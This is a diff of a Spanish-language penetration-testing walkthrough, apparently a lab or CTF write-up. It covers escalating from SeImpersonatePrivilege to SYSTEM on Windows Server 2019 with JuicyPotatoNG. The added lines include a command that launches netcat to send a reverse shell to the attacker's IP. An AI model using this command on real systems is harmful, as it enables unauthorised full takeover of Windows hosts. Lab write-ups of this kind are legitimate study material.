@@ -278,7 +278,11 @@ Lo primero que tenemos que realizar es enumerar los privilegios de nuestro usuar
 whoami /priv
 ```
 
-Vemos que tiene habilitado el `SeImpersonatePrivilege` 
-Para poder explotarlo nos descargaremos [[JUICYPOTATONG]] `https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1`, y nos lo compartimos a la maquina victima.
+Vemos que tiene habilitado el `SeImpersonatePrivilege` en Windows Server 2019 se supone que no se puede explotar pero se creo un binario llamado [[JUICYPOTATONG]] `https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1`, que nos permite explotarlo, y nos lo compartimos a la maquina victima.
 
-Lo ejecutamos
+Lo ejecutamos enviándonos una shell a nuestra maquina
+```shell
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\netcat.exe -e cmd 10.10.15.165 444"
+```
+
+Al ponernos en escucha obtendremos una shell cono `NT-AUTHORITY\SYSTEM`
